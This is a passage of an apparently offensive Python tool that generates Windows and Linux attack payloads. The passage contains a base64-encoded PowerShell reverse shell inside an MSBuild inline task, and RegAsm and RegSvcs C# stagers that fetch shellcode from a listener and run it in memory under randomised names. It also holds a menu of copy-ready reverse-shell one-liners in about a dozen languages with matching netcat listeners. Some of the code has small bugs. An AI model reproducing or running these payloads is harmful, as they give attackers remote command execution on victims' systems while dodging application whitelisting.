  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  MSBuild PowerShell XML file...")

  PS_script = "$client = New-Object System.Net.Sockets.TCPClient(\'" + listener_ip + "\'," + SHELL32_PORT + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  b64_script = base64.b64encode(PS_script)
  print(bcolors.ERROR + bcolors.BOLD + "***THE MSBuild PowerShell Payload has errors***" + bcolors.ENDC)
  targetname = randomString(7)
  classname = randomString(10)
  payloadname = randomString(8)
  decodename = randomString(12)
  runspacename = randomString(9)
  pipename = randomString(8)
  statename = randomString(8)

  msbps =  '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
  msbps += '  <Target Name="{0}">\n'.format(targetname)
  msbps += "    <{0} />\n".format(classname)
  msbps += "  </Target>\n"
  msbps += '  <UsingTask TaskName="{0}" TaskFactory="CodeTaskFactory"\n'.format(classname)
  msbps += r'    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"'+' >\n'
  msbps += '    <Task>\n'
  msbps += '    <Reference Include="System.Management.Automation" />\n'
  msbps += '      <Code Type="Class" Language="cs">\n'
  msbps += '        <![CDATA[\n'
  msbps += "            using System.Management.Automation;\n"
  msbps += "            using System.Management.Automation.Runspaces;\n"
  msbps += "            using Microsoft.Build.Framework;\n"
  msbps += "            using Microsoft.Build.Utilities;\n\n"
  msbps += "            public class %s : Task {\n" %(classname)
  msbps += "                public override bool Execute() {\n\n"
  msbps += "		        byte[] {0} = System.Convert.FromBase64String(\"{1}\");\n".format(payloadname, b64_script)
  msbps += "		        string {0} = System.Text.Encoding.UTF8.GetString({1});\n\n".format(decodename, payloadname)
  msbps += "		        Runspace {0} = RunspaceFactory.CreateRunspace();\n".format(runspacename)
  msbps += "		        {0}.Open();\n\n".format(runspacename)
  msbps += "		        Pipeline {0} = {1}.CreatePipeline();\n".format(pipename, runspacename)
  msbps += "		        {0}.Commands.AddScript({1});\n".format(pipename, decodename)
  msbps += "		        {0}.Invoke();\n\n".format(pipename)
  msbps += "		        {0}.Close();\n".format(runspacename)
  msbps += "		        return true;\n"
  msbps += "		    }\n"
  msbps += "		}\n"
  msbps += "        ]]>\n"
  msbps += "      </Code>\n"
  msbps += "    </Task>\n"
  msbps += "  </UsingTask>\n"
  msbps += "</Project>\n"

  msbps_xml_file = open(targetfile + "412-MSBuild-PS.xml", "w")
  msbps_xml_file.write(msbps)
  msbmet_xml_file.close()

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit MSBuild PowerShell BAT file...")
  msbmet_bat_file = open(targetfile + "413-MSBuild-PS.bat", "w")
  msbmet_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe 412-MSBuild-PS.xml")
  msbmet_bat_file.close()


##  Presentation HOst
def gen_420():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are setting up Presentation Host payload  NOW!" + bcolors.ENDC)
  print("\tMoving files!!")
  os.system("cp ./src/PWN-PS-W.zip " + targetfile + "400-PWN-PS-W.zip")

##  RegAsm
def gen_430():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are setting up RegAsm payloads  NOW!" + bcolors.ENDC)

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  RegAsm MET DLL file...")
  classhellcodeName = randomString(8)
  classhellcodeNameTwo = randomString()
  namespace = randomString(13)
  key = randomString()
  injectName = randomString(10)
  execName = randomString(11)
  bytearrayName = randomString(9)
  funcAddrName = randomString(8)
  savedStateName = randomString(7)
  shellcodeName = randomString(12)
  rand_bool = randomString(11)
  random_out = randomString(9)
  getDataName = randomString(8)
  hThreadName = randomString(10)
  threadIdName = randomString()
  pinfoName = randomString(8)
  y = [randomString(9) for x in range(17)]

  asmmet = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
  asmmet += "namespace {0}\n {{".format(namespace)
  asmmet += "\n\tpublic class {0} : ServicedComponent {{\n".format(classhellcodeName)
  asmmet += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(classhellcodeName)
  asmmet += "\n\t\t[ComRegisterFunction]"
  asmmet += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
  asmmet += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classhellcodeNameTwo, execName)
  asmmet += "\n[ComUnregisterFunction]"
  asmmet += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
  asmmet += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classhellcodeNameTwo, execName)
  asmmet += "\n\tpublic class {0}\n\t{{".format(classhellcodeNameTwo)
  asmmet += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

  hostName = randomString(9)
  portName = randomString(10)
  ipName = randomString()
  sockName = randomString(8)
  length_rawName = randomString(11)
  lengthName = randomString()
  sName = randomString(13)
  total_bytesName = randomString(9)
  handleName = randomString(8)

  asmmet += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
  asmmet += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
  asmmet += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
  asmmet += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
  asmmet += "    catch { return null;}\n"
  asmmet += "    byte[] %s = new byte[4];\n" %(length_rawName)
  asmmet += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
  asmmet += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
  asmmet += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
  asmmet += "    int %s = 0;\n" %(total_bytesName)
  asmmet += "    while (%s < %s)\n" %(total_bytesName, lengthName)
  asmmet += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
  asmmet += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
  asmmet += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
  asmmet += "    return %s;}\n" %(sName)
  asmmet += "static void %s(byte[] %s) {\n" %(injectName, shellcodeName)
  asmmet += "    if (%s != null) {\n" %(shellcodeName)
  asmmet += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, shellcodeName)
  asmmet += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, shellcodeName)
  asmmet += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, shellcodeName, shellcodeName)
  asmmet += '       UInt32 {} = 0;\n'.format(threadIdName)
  asmmet += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
  asmmet += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
  asmmet += "\n\t\tpublic static void {0}() {{\n".format(execName)
  asmmet += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, listener_ip, METRT32_PORT)
  asmmet += "    %s(%s);\n" %(injectName, sName)
  asmmet += "                        }\n"
  asmmet += "               }\n"
  asmmet += "       }\n"

  asmmet_cs_file = open(targetfile + "430-RegAsm-MET.cs", "w")
  asmmet_cs_file.write(asmmet)
  asmmet_cs_file.close()

  os.system("mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms " + targetfile + "430-RegAsm-MET.cs  -out:" + targetfile +"430-Regasm-Met.dll")

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit MSBuild MET BAT file...")
  asmmet_bat_file = open(targetfile + "431-RegAsm-MET.bat", "w")
  asmmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 430-Regasm-Met.dll")
  asmmet_bat_file.close()

  print(bcolors.ERROR + bcolors.BOLD + "***I still need to create a basic shell and PowerShell payload for RegAsm ***" + bcolors.ENDC)


##  Regsvcs
def gen_440():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are setting up RegSvcs payloads  NOW!" + bcolors.ENDC)

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  RegSvcs MET DLL file...")

  classhellcodeName = randomString(11)
  classhellcodeNameTwo = randomString(10)
  namespace = randomString(7)
  key = randomString(10)
  injectName = randomString()
  execName = randomString(9)
  bytearrayName = randomString(12)
  funcAddrName = randomString()
  savedStateName = randomString(8)
  shellcodeName = randomString(10)
  rand_bool = randomString(7)
  random_out = randomString(8)
  getDataName = randomString(11)
  hThreadName = randomString()
  threadIdName = randomString(10)
  pinfoName = randomString(9)
  y = [randomString(10) for x in range(17)]

  svcsmet = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
  svcsmet += "namespace {0}\n {{".format(namespace)
  svcsmet += "\n\tpublic class {0} : ServicedComponent {{\n".format(classhellcodeName)
  svcsmet += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(classhellcodeName)
  svcsmet += "\n\t\t[ComRegisterFunction]"
  svcsmet += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
  svcsmet += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classhellcodeNameTwo, execName)
  svcsmet += "\n[ComUnregisterFunction]"
  svcsmet += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
  svcsmet += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classhellcodeNameTwo, execName)
  svcsmet += "\n\tpublic class {0}\n\t{{".format(classhellcodeNameTwo)
  svcsmet += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

  hostName = randomString(12)
  portName = randomString(7)
  ipName = randomString(10)
  sockName = randomString()
  length_rawName = randomString(11)
  lengthName = randomString(7)
  sName = randomString(10)
  total_bytesName = randomString(8)
  handleName = randomString(9)

  svcsmet += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
  svcsmet += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
  svcsmet += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
  svcsmet += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
  svcsmet += "    catch { return null;}\n"
  svcsmet += "    byte[] %s = new byte[4];\n" %(length_rawName)
  svcsmet += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
  svcsmet += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
  svcsmet += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
  svcsmet += "    int %s = 0;\n" %(total_bytesName)
  svcsmet += "    while (%s < %s)\n" %(total_bytesName, lengthName)
  svcsmet += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
  svcsmet += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
  svcsmet += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
  svcsmet += "    return %s;}\n" %(sName)
  svcsmet += "static void %s(byte[] %s) {\n" %(injectName, shellcodeName)
  svcsmet += "    if (%s != null) {\n" %(shellcodeName)
  svcsmet += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, shellcodeName)
  svcsmet += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, shellcodeName)
  svcsmet += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, shellcodeName, shellcodeName)
  svcsmet += '       UInt32 {} = 0;\n'.format(threadIdName)
  svcsmet += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
  svcsmet += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
  svcsmet += "\n\t\tpublic static void {0}() {{\n".format(execName)
  svcsmet += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, listener_ip, METRT32_PORT)
  svcsmet += "    %s(%s);\n" %(injectName, sName)
  svcsmet += "                        }\n"
  svcsmet += "               }\n"
  svcsmet += "       }\n"

  svcsmet_cs_file = open(targetfile + "440-Regsvcs-MET.cs", "w")
  svcsmet_cs_file.write(svcsmet)
  svcsmet_cs_file.close()

  os.system("sn -k /tmp/key.snk")
  os.system("mcs -platform:x86 -target:library -keyfile:/tmp/key.snk -r:System.EnterpriseServices,System.Windows.Forms " + targetfile + "440-Regsvcs-MET.cs  -out:" + targetfile +"440-Regsvcs-Met.dll")

  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Regsvcs MET BAT file...")
  svcsmet_bat_file = open(targetfile + "441-Regsvcs-MET.bat", "w")
  svcsmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\resvcs.exe 440-Regsvcs-Met.dll")
  svcsmet_bat_file.close()

  print(bcolors.ERROR + bcolors.BOLD + "***I still need to create a basic shell and PowerShell payload for Regsvcs ***" + bcolors.ENDC)

##Shells 
def Shells():
  global listener_ip
  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tLets Play with some Shells!!" + bcolors.ENDC)
  while(1):
    print(bcolors.ERROR + "\t*******************************************************************" + bcolors.ENDC)
    print("\t(1)\tBASH Reverse Shell --------- (Linux|Unix)")
    print("\t(2)\tPERL Reverse Shell --------- (Linux|Unix)")
    print("\t(3)\tPERL Reverse Shell --------- (Windows)")
    print("\t(4)\tPowerShell Reverse Shell --- (Windows)")
    print("\t(5)\tPython Reverse Shell ------- (Windows|Linx|Unix)")
    print("\t(6)\tPHP Reverse Shell ---------- (Linux|Unix)")
    print("\t(7)\tRuby Reverse Shell --------- (Linux|Unix)")
    print("\t(8)\tRuby Reverse Shell --------- (Windows)")
    print("\t(9)\tGolang Reverse Shell ------- (Linux|Unix)")
    print("\t(10)\tAwk Reverse Shell --------- (Linux|Unix)")
    print("\t(11)\tJava Reverse Shell -------- (Linux|Unix)")
    print("\t(12)\tJava Reverse Shell -------- (Windows)")
    print("\t(999)\t Go back to the main menu")
    print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)

    options = int(input("\nPiCk a S4e11 bro-pop: "))

    if options == 1:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tBASH SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "bash -i >& /dev/tcp/" + listener_ip + "/1337 0>&1\n\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tBASH Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1337\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 2:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -e \'use Socket;$i=\"' + listener_ip + '\";$p=1338;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n') 
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1338\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 3:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,' + listener_ip + ':1338\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'\n')
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1338\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 4:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPowerShell Reverse  SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "$client = New-Object System.Net.Sockets.TCPClient(\'" + listener_ip +  "\',1339);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPowerShell Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1339\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 5:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Reverse  SHELL\n\n***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n") 
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "-c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + listener_ip + "\', 1340)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(\'except\', (), {\'__enter__\': lambda self: None, \'__exit__\': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(\'try\', (), {\'__enter__\': lambda self: None, \'__exit__\': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[\'p2s_thread\'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[\'s2p_thread\'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[\'p\'] in [(subprocess.Popen([\'\\windows\\system32\\cmd.exe\'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[\'s\'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[\'p2s\'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[\'s\'].send(__l[\'p\'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[\'s\'], __l[\'p\'] in [(s, p)]][0])({}), \'p2s\')]][0] for __g[\'s2p\'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[\'p\'].stdin.write(__l[\'data\']), __after())[1] if (len(__l[\'data\']) > 0) else __after())(lambda: __this()) for __l[\'data\'] in [(__l[\'s\'].recv(1024))]][0] if True else __after())())(lambda: None) for __l[\'s\'], __l[\'p\'] in [(s, p)]][0])({}), \'s2p\')]][0] for __g[\'os\'] in [(__import__(\'os\', __g, __g))]][0] for __g[\'socket\'] in [(__import__(\'socket\', __g, __g))]][0] for __g[\'subprocess\'] in [(__import__(\'subprocess\', __g, __g))]][0] for __g[\'threading\'] in [(__import__(\'threading\', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(\'contextlib\'))\"\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1340\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 6:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "php -r \'$sock=fsockopen(\"" + listener_ip +  "\",1341);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP Listener\t\t***\n" + bcolors.ENDC)  
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1341\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 7:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'exit if fork;c=TCPSocket.new(\"" + listener_ip + "\",\"1342\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1342\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 8:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'c=TCPSocket.new(\"" + listener_ip  + "\",\"1343\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1343\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 9:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tGoLang Reverse  SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + listener_ip  + ":1344\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tGoLang Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1344\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 10:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Reverse  SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n") 
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "awk \'BEGIN {s = \"/inet/tcp/0/" + listener_ip + "/1345\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n")
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1345\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 11:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Reverse  SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/1346;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
""" % listener_ip)
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1346\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 12:
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Reverse  SHELL\t\t***\n" + bcolors.ENDC)
        print("\t*******************************************************************\n") 
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
String host="%s";
int port=1347;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
""" % listener_ip)
        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Listener\t\t***\n" + bcolors.ENDC)
        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1339\n\n\n")
        print("\t*******************************************************************\n")
    elif options == 999:
        break
    else:
       input("Go ahead and pick the shell you need!: ")


## Quit
def exit():
  print(bcolors.BOLD + "\t\tBYE FOOLZ!! Maybe next time you will not be such a nerd!" + bcolors.ENDC)
  sys.exit(0)


# Main interface
def main():
  global listener_ip
  global local_ip
  print(bcolors.BOLD + bcolors.BLUE+"""\

             __  __          _                                           
            |  \/  |   /\   | |                                          
